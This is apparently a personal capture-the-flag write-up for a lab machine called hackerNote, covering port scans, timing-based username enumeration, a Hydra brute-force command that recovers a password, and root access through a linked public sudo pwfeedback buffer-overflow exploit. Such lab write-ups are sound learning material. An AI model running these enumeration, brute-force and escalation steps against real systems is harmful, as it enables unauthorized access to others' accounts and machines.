Port scanning.
```bash
nmap -p- --min-rate=5000 10.10.100.99 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 21:02 EEST
Nmap scan report for 10.10.100.99
Host is up (0.23s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,8080 -sC -sV 10.10.100.99 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-29 21:03 EEST
Nmap scan report for 10.10.100.99
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
|_  256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
8080/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Home - hackerNote
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
```
Ok so we have an SSH and 2 http's. Both running golang


There is a login which allows for enumerating since the time difference between the server checking the credentials varies alot between.

I ran the https://github.com/NinjaJc01/hackerNoteExploits

exploit.py script and found out the usernames that are in the database since the time difference for them was very noticeable by the script

```bash
┌──(kali㉿kali)-[~/exploit/hackerNoteExploits]
└─$ python3 exploit.py
Starting POST Requests
Finished POST requests
Time delta: 0.2283945083618164 seconds (larger is better)
james is likely to be valid
```


so we will bruteforce james logins

There is a hint feature and it says that the password is his favorite color+number

I used this tool https://github.com/hashcat/hashcat-utils/releases
which combines the list and colors we were given by the machine to create all possible combinations.Now its just bruteforcing it.

One of the questions in the machine was how many passsowrds were in your wordslist
we can find that out with wc -l passwords. and the result is 180. 

```bash
hydra -l james -P passwords 10.10.100.99 http-post-form '/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password'

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-29 21:42:28
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
[DATA] attacking http-post-form://10.10.100.99:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
[80][http-post-form] host: 10.10.100.99   login: james   password: blue7
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-29 21:43:5
```

And once we log in we can see that his ssh password is in there.

```bash
My SSH details

So that I don't forget, my SSH password is dak4ddb37b
```

There we can get the user.txt


We can't run any commands as sudo but it has the pwdfeedback and I have just recently done another machien which also had that. It has a priviledge escalation since there is a buffer overflow exploit on it. 

https://github.com/saleemrashid/sudo-cve-2019-18634

I copied the exploit and compiled it in c and then changed it to be executable and then i executed it and we got root and then i was able to read the root.txt and compelete the machine


